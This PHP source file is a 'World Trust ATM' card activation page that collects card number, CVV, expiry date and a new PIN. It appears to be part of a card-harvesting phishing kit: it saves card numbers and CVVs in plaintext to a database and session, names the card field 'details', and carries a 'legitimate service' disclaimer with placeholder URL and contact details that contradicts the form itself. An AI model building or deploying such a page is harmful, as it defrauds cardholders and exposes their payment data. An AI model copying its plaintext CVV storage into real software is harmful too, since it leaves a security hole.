<?php
/**
 * World Trust ATM - Card Activation
 * Page 2: Card Details & PIN Setup
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';
require_once 'includes/database.php';

// Check session - user must have completed step 1
check_user_session();
check_session_timeout();

$errors = [];

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $card_number = sanitize_input($_POST['details'] ?? '');
    $cvv = sanitize_input($_POST['cvv'] ?? '');
    $expiry = sanitize_input($_POST['expiry'] ?? '');
    $pin = sanitize_input($_POST['pin'] ?? '');
    $confirm_pin = sanitize_input($_POST['confirm_pin'] ?? '');
    
    // Remove spaces from card number
    $card_number = preg_replace('/\s+/', '', $card_number);
    
    // Validate card number
    if (empty($card_number)) {
        $errors['details'] = 'Card number is required';
    } elseif (!validate_card_number($card_number)) {
        $errors['details'] = 'Please enter a valid 16-digit card number';
    }
    
    // Validate CVV
    if (empty($cvv)) {
        $errors['cvv'] = 'CVV is required';
    } elseif (!validate_cvv($cvv)) {
        $errors['cvv'] = 'Please enter a valid 3-digit CVV';
    }
    
    // Validate expiry
    if (empty($expiry)) {
        $errors['expiry'] = 'Expiration date is required';
    } elseif (!preg_match('/^\d{2}\/\d{2}$/', $expiry)) {
        $errors['expiry'] = 'Expiration date must be in MM/YY format';
    }
    
    // Validate PIN
    if (empty($pin)) {
        $errors['pin'] = 'PIN is required';
    } elseif (!validate_pin($pin)) {
        $errors['pin'] = 'PIN must be exactly 4 digits';
    }
    
    // Validate confirm PIN
    if (empty($confirm_pin)) {
        $errors['confirm_pin'] = 'Please confirm your PIN';
    } elseif ($pin !== $confirm_pin) {
        $errors['confirm_pin'] = 'PINs do not match';
    }
    
    // If no errors, save to database and redirect
    if (empty($errors)) {
        $pin_hash = password_hash($pin, PASSWORD_DEFAULT);
        $request_id = $_SESSION['request_id'] ?? null;
        
        // Update the activation request with card details and PIN
        if ($request_id) {
            $db = get_db_connection();
            if ($db) {
                try {
                    $stmt = $db->prepare('UPDATE activation_requests 
                                          SET card_number = ?, cvv = ?, expiry_date = ?, pin_hash = ?
                                          WHERE id = ?');
                    $stmt->execute([$card_number, $cvv, $expiry, $pin_hash, $request_id]);
                    
                    // Store card details in session for card-display.php
                    $_SESSION['card_number'] = $card_number;
                    $_SESSION['cvv'] = $cvv;
                    $_SESSION['expiry'] = $expiry;
                    $_SESSION['balance'] = DEFAULT_BALANCE;
                    
                    // Redirect to card display
                    header('Location: card-display.php');
                    exit();
                } catch (PDOException $e) {
                    error_log('Failed to update card details: ' . $e->getMessage());
                    $errors['general'] = 'Failed to save card details. Please try again.';
                }
            } else {
                $errors['general'] = 'Database connection failed. Please try again.';
            }
        } else {
            $errors['general'] = 'Session expired. Please start over.';
        }
    }
}

$user_name = get_full_name();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - Card Information & PIN Setup</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- PIN Setup Container -->
        <div class="pin-setup-container" id="pinSetupContainer">
            <h2 class="form-title">Card Information & PIN Setup</h2>
            <p class="form-subtitle">Enter your card details and set up your secure PIN</p>
            
            <span class="security-badge">Secure Form</span>
            
            <?php if (isset($errors['general'])): ?>
                <div class="error-message show" style="margin-bottom: 20px; display: block; background: #fff3cd; padding: 15px; border-radius: 8px; border: 1px solid #ffc107;">
                    <?php echo $errors['general']; ?>
                </div>
            <?php endif; ?>
            
            <form id="pinSetupForm" method="POST" action="" novalidate>
                <!-- Card Details Section -->
                <div class="card-details-section">
                    <h3 class="section-title">Card Information</h3>
                    
                    <div class="form-group">
                        <label for="details">Card Number <span class="required">*</span></label>
                        <input type="text" id="details" name="details" 
                               placeholder="1234 5678 9012 3456" 
                               maxlength="19"
                               value="<?php echo htmlspecialchars($_POST['details'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['details'])): ?>
                            <span class="error-message show"><?php echo $errors['details']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label for="expiry">Expiration Date (MM/YY) <span class="required">*</span></label>
                            <input type="text" id="expiry" name="expiry" 
                                   placeholder="MM/YY" 
                                   maxlength="5"
                                   value="<?php echo htmlspecialchars($_POST['expiry'] ?? ''); ?>"
                                   required aria-required="true">
                            <?php if (isset($errors['expiry'])): ?>
                                <span class="error-message show"><?php echo $errors['expiry']; ?></span>
                            <?php endif; ?>
                        </div>
                        
                        <div class="form-group">
                            <label for="cvv">CVV <span class="required">*</span></label>
                            <input type="password" id="cvv" name="cvv" 
                                   placeholder="123" 
                                   maxlength="3"
                                   required aria-required="true">
                            <?php if (isset($errors['cvv'])): ?>
                                <span class="error-message show"><?php echo $errors['cvv']; ?></span>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                
                <!-- PIN Setup Section -->
                <div class="pin-section">
                    <h3 class="section-title">Set Your PIN</h3>
                    
                    <div class="form-group">
                        <label for="pin">Enter PIN (4 digits) <span class="required">*</span></label>
                        <div class="pin-input-wrapper">
                            <input type="password" id="pin" name="pin" 
                                   maxlength="4" 
                                   placeholder="****"
                                   required aria-required="true">
                            <button type="button" class="toggle-pin" data-target="pin" aria-label="Toggle PIN visibility">
                                👁️
                            </button>
                        </div>
                        <?php if (isset($errors['pin'])): ?>
                            <span class="error-message show"><?php echo $errors['pin']; ?></span>
                        <?php endif; ?>
                        <div class="pin-strength">
                            <div class="strength-label">PIN Strength: <span id="strengthText">-</span></div>
                            <div class="strength-bar">
                                <div class="strength-fill" id="strengthFill"></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="confirm_pin">Confirm PIN <span class="required">*</span></label>
                        <div class="pin-input-wrapper">
                            <input type="password" id="confirm_pin" name="confirm_pin" 
                                   maxlength="4" 
                                   placeholder="****"
                                   required aria-required="true">
                            <button type="button" class="toggle-pin" data-target="confirm_pin" aria-label="Toggle PIN visibility">
                                👁️
                            </button>
                        </div>
                        <?php if (isset($errors['confirm_pin'])): ?>
                            <span class="error-message show"><?php echo $errors['confirm_pin']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <button type="submit" class="btn btn-primary">Continue to Card Display</button>
            </form>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
        </div>
    </div>
    
    <script src="js/pin-setup.js"></script>
</body>
</html>
